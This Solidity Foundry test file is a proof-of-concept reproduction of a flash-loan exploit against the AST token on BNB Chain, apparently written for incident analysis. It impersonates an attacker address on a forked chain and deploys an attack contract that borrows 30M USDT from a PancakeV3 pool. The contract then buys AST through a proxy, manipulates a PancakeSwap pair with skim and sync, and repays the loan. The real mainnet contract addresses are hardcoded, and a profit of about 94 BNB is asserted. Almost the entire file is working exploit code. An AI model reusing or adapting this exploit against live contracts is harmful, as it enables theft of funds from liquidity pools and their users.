
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 45964639;
    uint256 constant TX_TIMESTAMP = 1737475212;
    uint256 constant TX_BLOCK_NUMBER = 45964640;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        AstFlashAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (AstFlashAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = AstFlashAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new AstFlashAttack();
        }
    }

    function _prepareProfit(AstFlashAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(AstFlashAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "BNB", 94198970316293948336);
    }
}

contract AstFlashAttack {
    function attack() external payable {
        _startExploit();
    }

    function _startExploit() internal {
        _withdrawAst();
        _borrowUsdtFlash();
        uint256 usdtProfitToSell = IERC20Like(Addresses.USDT).balanceOf(address(this));
        _sellUsdtProfit(usdtProfitToSell);
    }

    function _withdrawAst() internal {
        IERC1967Proxy(Addresses.ERC1967Proxy).withdraw();
    }

    function _borrowUsdtFlash() internal {
        IPancakeV3Pool(Addresses.PancakeV3Pool)
            .flash(
                address(this),
                30000000000000000000000000,
                0,
                hex"00000000000000000000000000000000000000000018d0bf423c03d8de000000"
            );
    }

    function flashCallback() internal {
        _approveRouter();
        _buyAstThroughProxy();

        uint256 pairAstBalance = IERC20Like(Addresses.AST).balanceOf(Addresses.PancakePair);
        IERC20Like(Addresses.AST).balanceOf(address(this));

        _seedAstPair(pairAstBalance - 1);
        _syncAstPair();

        IERC20Like(Addresses.AST).approve(Addresses.PancakeRouter, type(uint256).max);
        uint256 astDustToSell = IERC20Like(Addresses.AST).balanceOf(address(this));
        _sellAstDust(astDustToSell);
        _repayFlashLoan();
    }

    receive() external payable {}

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata callbackData) external payable {
        fee0;
        fee1;
        callbackData;
        flashCallback();
    }

    fallback() external payable {
        if (msg.sig == 0x1dbc4eeb) {
            _startExploit();
            return;
        }
    }

    function _approveRouter() internal {
        IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
        IERC20Like(Addresses.AST).approve(Addresses.PancakeRouter, type(uint256).max);
        IERC20Like(Addresses.PancakePair).approve(Addresses.PancakeRouter, type(uint256).max);
    }

    function _buyAstThroughProxy() internal {
        address[] memory path = new address[](2);
        path[0] = Addresses.USDT;
        path[1] = Addresses.AST;
        IPancakeRouter(Addresses.PancakeRouter)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                30000000000000000000000000, 0, path, Addresses.ERC1967Proxy, 1737475212
            );
    }

    function _seedAstPair(uint256 astAmount) internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakePair, 100000000000000000);
        IERC20Like(Addresses.AST).transfer(Addresses.PancakePair, astAmount);
    }

    function _syncAstPair() internal {
        IPancakePair(Addresses.PancakePair).skim(address(this));
        IPancakePair(Addresses.PancakePair).sync();
    }

    function _sellAstDust(uint256 astAmount) internal {
        address[] memory path = new address[](2);
        path[0] = Addresses.AST;
        path[1] = Addresses.USDT;
        IPancakeRouter(Addresses.PancakeRouter)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(astAmount, 0, path, address(this), 1737475212);
    }

    function _repayFlashLoan() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool, 30015000000000000000000000);
    }

    function _sellUsdtProfit(uint256 usdtAmount) internal {
        address[] memory path = new address[](2);
        path[0] = Addresses.USDT;
        path[1] = Addresses.WBNB;
        IPancakeRouter(Addresses.PancakeRouter)
            .swapExactTokensForETH(usdtAmount, 0, path, Addresses.attacker_eoa, 1737475212);
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant PancakeV3Pool = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant attacker_eoa = 0x56f77AdC522BFfebB3AF0669564122933AB5EA4f;
    address internal constant PancakePair = 0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a;
    address internal constant attack_contract = 0xAa0cee271F7c1a14Cd0777283Cb5741E46a2c732;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant AST = 0xc10E0319337c7F83342424Df72e73a70A29579B2;
    address internal constant ERC1967Proxy = 0xc8B9817eB65B7d7e85325f23A60D5839d14F9Ce4;
}

interface IPancakePair {
    function skim(address) external;
    function sync() external;
}

interface IERC1967Proxy {
    function withdraw() external;
}

interface IPancakeRouter {
    function swapExactTokensForETH(uint256, uint256, address[] calldata, address, uint256) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
}

interface IPancakeV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
}
